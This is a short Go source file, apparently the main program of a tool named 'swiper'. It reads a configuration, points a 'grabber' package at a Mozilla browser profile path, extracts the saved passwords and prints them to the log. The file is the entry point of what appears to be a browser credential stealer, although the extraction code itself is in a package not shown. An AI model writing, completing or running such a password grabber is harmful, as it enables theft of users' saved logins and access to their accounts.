package main

import (
	"log"
	"swiper/configurator"
	"swiper/grabber"
)

func main() {
	c := configurator.New()

	config, err := c.Config()
	if err != nil {
		log.Fatal(err)
	}

	grab := grabber.New(config.MozillaPath)

	passwords, err := grab.Passwords()
	if err != nil {
		log.Fatal(err)
	}

	log.Println(passwords)
}
